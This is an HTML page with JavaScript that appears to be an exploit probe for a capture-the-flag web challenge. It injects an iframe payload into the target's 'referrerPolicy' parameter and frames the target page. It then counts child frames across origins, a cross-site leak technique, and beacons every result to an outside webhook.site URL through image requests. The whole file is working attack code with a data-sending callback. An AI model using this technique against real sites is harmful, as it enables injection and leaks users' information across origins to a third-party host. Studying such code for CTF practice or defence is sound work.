<!DOCTYPE html>
<html>
<body>
<script>
var CHALL = 'https://notes.chall.lac.tf';
var WH = 'https://webhook.site/c9c4e814-b8d9-47ab-ace4-1afa4d09088f';
var ADS = 'https://ads.chall.lac.tf';

function ping(msg) { new Image().src = WH + '?' + encodeURIComponent(msg); }
function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }

ping('v5_debug');

async function debugTest() {
  // TEST 1: Load challenge page WITH srcdoc injection
  var payload = '<iframe src=' + ADS + '/1.html></iframe>';
  var url1 = CHALL + '/?srcdoc=x&referrerPolicy=' + encodeURIComponent(payload) + '&search=zzzzz';
  var f1 = document.createElement('iframe');
  f1.src = url1;
  f1.style.cssText = 'width:400px;height:400px';
  document.body.appendChild(f1);

  // TEST 2: Load challenge page WITHOUT injection (normal)
  var url2 = CHALL + '/?referrerPolicy=no-referrer&search=zzzzz';
  var f2 = document.createElement('iframe');
  f2.src = url2;
  f2.style.cssText = 'width:400px;height:400px';
  document.body.appendChild(f2);

  await sleep(5000);

  // Analyze TEST 1 (with srcdoc injection)
  try {
    var len1 = f1.contentWindow.length;
    ping('T1_total=' + len1);
    for (var k = 0; k < Math.min(len1, 3); k++) {
      try {
        var child = f1.contentWindow[k];
        var clen = child.length;
        var hasZero = 'no';
        try { hasZero = typeof child[0]; } catch(e2) { hasZero = 'err:' + e2.message; }
        ping('T1_k=' + k + '_len=' + clen + '_child0=' + hasZero);
      } catch(e) {
        ping('T1_k=' + k + '_ERR=' + e.message);
      }
    }
  } catch(e) {
    ping('T1_ERR=' + e.message);
  }

  // Analyze TEST 2 (normal, no injection)
  try {
    var len2 = f2.contentWindow.length;
    ping('T2_total=' + len2);
    for (var k = 0; k < Math.min(len2, 3); k++) {
      try {
        var child = f2.contentWindow[k];
        var clen = child.length;
        var hasZero = 'no';
        try { hasZero = typeof child[0]; } catch(e2) { hasZero = 'err:' + e2.message; }
        ping('T2_k=' + k + '_len=' + clen + '_child0=' + hasZero);
      } catch(e) {
        ping('T2_k=' + k + '_ERR=' + e.message);
      }
    }
  } catch(e) {
    ping('T2_ERR=' + e.message);
  }

  // TEST 3: window.open approach
  try {
    var w = window.open(url1);
    await sleep(5000);
    var wlen = w.length;
    ping('T3_open_total=' + wlen);
    for (var k = 0; k < Math.min(wlen, 3); k++) {
      try {
        ping('T3_k=' + k + '_len=' + w[k].length + '_child0=' + typeof w[k][0]);
      } catch(e) {
        ping('T3_k=' + k + '_ERR=' + e.message);
      }
    }
    w.close();
  } catch(e) {
    ping('T3_ERR=' + e.message);
  }

  ping('debug_done');
}

debugTest();
</script>
</body>
</html>
